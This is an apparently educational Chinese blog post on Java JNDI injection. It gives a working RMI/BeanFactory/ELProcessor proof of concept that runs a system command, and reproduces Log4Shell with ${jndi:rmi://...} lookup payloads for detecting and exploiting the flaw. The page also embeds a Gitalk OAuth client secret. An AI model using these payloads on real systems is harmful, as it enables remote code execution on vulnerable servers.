@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="1y0ng" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      java反序列化之jndi 
+      
+      
+      |
+    
+     1y0ng&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon2.png">
+    <link rel="icon" href="/images/favicon2.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="1y0ng's Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/favicon2.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">1y0ng</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/Tool/">
+          <a href="/Tool/">Tool</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">java反序列化之jndi</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2023-06-14 19:56:20
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">
+                    #反序列化
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="jndi加载本地类利用">jndi加载本地类利用</h1>
+<p>上一个篇中讲了jndi结合RMI的利用,然而这个利用只适用于<code> JDK &lt; 8u191</code>的情况,在高版本的jdk中,我们可以通过<code>加载本地类</code>的方法进行命令执行。</p>
+<p>之前在Reference中传入了一个工厂类名,然后让程序去找这个工厂类的位置,最终加载到了我们所构建的恶意类并调用了其构造方法,而这次我们将直接利用本地存在的工厂类去执行命令。</p>
+<p>这里利用的是<code>tomcat8</code>带有的<code>BeanFactory类</code>,这个类中带有method.invoke可以通过反射来调用任意方法。</p>
+<p>首先导入依赖（这里org.apache.el如果导入失败的话需要换个源,我是用<code>阿里云</code>的源）：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>poc代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
+<p>客户端：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Object&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<p><img src="image-20230402123833616.png" alt="image-20230402123833616"></p>
+<p>利用链：<br>
+InitialContext#lookup</p>
+<p>GenericURLContext#lookup</p>
+<p>RegistryContext#lookup</p>
+<p>RegistryContext#decodeObject</p>
+<p>NamingManager#getObjectInstance</p>
+<p>BeanFactory#getObjectInstance</p>
+<p>反射执行的语句：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span>  <span class="title class_">ELProcessor</span>()).eval(<span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new  java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>解释：</p>
+<ol>
+<li>“”.getClass() 返回字符串对象的Class对象。</li>
+<li>Class.forName() 可以根据类的名称返回对应的Class对象。</li>
+<li>newInstance() 可以使用Class对象实例化一个对象。</li>
+<li>getEngineByName() 返回指定名称的脚本引擎对象,这里是JavaScript引擎对象。</li>
+<li>eval() 方法用于执行脚本。</li>
+<li>ProcessBuilder 类可以启动一个新进程并执行操作系统命令。</li>
+</ol>
+<h1 id="jndi-log4j2">jndi+log4j2</h1>
+<p>Log4j2是Apache软件基金会下的一个开源项目,是Java编程语言的一种流行的、模块化的<code>日志记录工具</code>,用于记录应用程序的运行状态信息和调试信息。</p>
+<p>而在2021年11月log4j2爆出了一个代码执行漏洞,影响范围非常大,2.14.1版本及之前的都存在该漏洞</p>
+<p>而这个漏洞的利用正好与jndi注入有关</p>
+<h2 id="环境搭建">环境搭建</h2>
+<p>首先导入依赖（版本小于2.14.1即可）：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>编写log4j2的配置文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--全局参数--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss,SSS&#125; %5p %c&#123;1&#125;:%L - %m%n<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;logDir&quot;</span>&gt;</span>/data/logs/dust-server<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;console&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;rolling_file&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义输出到控制台 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> <span class="attr">follow</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--控制台只输出level及以上级别的信息--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ThresholdFilter</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">onMatch</span>=<span class="string">&quot;ACCEPT&quot;</span> <span class="attr">onMismatch</span>=<span class="string">&quot;DENY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;pattern&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 同一来源的Appender可以定义多个RollingFile,定义按天存储日志 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">RollingFile</span> <span class="attr">name</span>=<span class="string">&quot;rolling_file&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">fileName</span>=<span class="string">&quot;$&#123;logDir&#125;/dust-server.log&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">filePattern</span>=<span class="string">&quot;$&#123;logDir&#125;/dust-server_%d&#123;yyyy-MM-dd&#125;.log&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ThresholdFilter</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">onMatch</span>=<span class="string">&quot;ACCEPT&quot;</span> <span class="attr">onMismatch</span>=<span class="string">&quot;DENY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;pattern&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Policies</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">TimeBasedTriggeringPolicy</span> <span class="attr">interval</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Policies</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 日志保留策略,配置只保留七天 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">DefaultRolloverStrategy</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Delete</span> <span class="attr">basePath</span>=<span class="string">&quot;$&#123;logDir&#125;/&quot;</span> <span class="attr">maxDepth</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">IfFileName</span> <span class="attr">glob</span>=<span class="string">&quot;dust-server_*.log&quot;</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">IfLastModified</span> <span class="attr">age</span>=<span class="string">&quot;7d&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">Delete</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">DefaultRolloverStrategy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RollingFile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>测试：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;java:os&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="image-20230402194044347.png" alt="image-20230402194044347"></p>
+<p>这里就输出了操作系统的一些信息,这实际上是log4j2自带的一些功能</p>
+<p>但除此之外,它还支持调用<code>lookup</code>,那么这里就会存在我们之前所说的命令执行漏洞</p>
+<h2 id="漏洞探测">漏洞探测</h2>
+<p>修改测试代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;jndi:rmi://foei54.dnslog.cn/Object&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>foei54.dnslog.cn为我们在dnslog平台得到的url</p>
+<p>运行测试代码并查看dns记录,出现以下结果则说明漏洞存在</p>
+<p><img src="image-20230402200004246.png" alt="image-20230402200004246"></p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>修改测试代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/Object&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将之前测试jndi的服务端程序运行起来,然后运行测试代码</p>
+<p>效果：</p>
+<p><img src="image-20230402194654780.png" alt="image-20230402194654780"></p>
+<p>可以看到命令被成功执行了</p>
+<p>实际上在正常的生产环境中,log4j2会写入非常多的事件,哪怕是一个简单的用户登录事件,这时候我们就可以修改用户名的内容为${jndi:rmi://foei54.dnslog.cn/Object}来测试漏洞是否存在。</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8214">JNDI注入学习</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lumingzhu111/article/details/121871114">一问三不知之log4j2漏洞简析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/341857.html">深入学习 Log4j2 漏洞原理以及绕过手段</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/2023/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2023-06-14 19:56:20
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">
+                        #反序列化
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/post/2023/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#jndi%E5%8A%A0%E8%BD%BD%E6%9C%AC%E5%9C%B0%E7%B1%BB%E5%88%A9%E7%94%A8"><span class="toc-text">jndi加载本地类利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jndi-log4j2"><span class="toc-text">jndi+log4j2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-text">漏洞探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <div id="gitalk-container"></div>
+
+  <script>
+    function loadGitalkSuc() {
+      const gitalk = new Gitalk({
+        clientID: '94b011918fa9c2f8b107',
+        clientSecret: '10c1ce2d3cc22cc3586cb5ce5f7b322f1ebc1c6d',
+        repo: '1y0ng.github.io',
+        owner: '1y0ng',
+        admin: ['1y0ng'],
+        id: location.pathname,
+        distractionFreeMode: false
+      })
+
+      gitalk.render('gitalk-container')
+    }
+  </script>
+  
+    <link rel="stylesheet" href="/plugins/gitalk.css">
+    <script type="text/javascript" src="/plugins/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+  
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
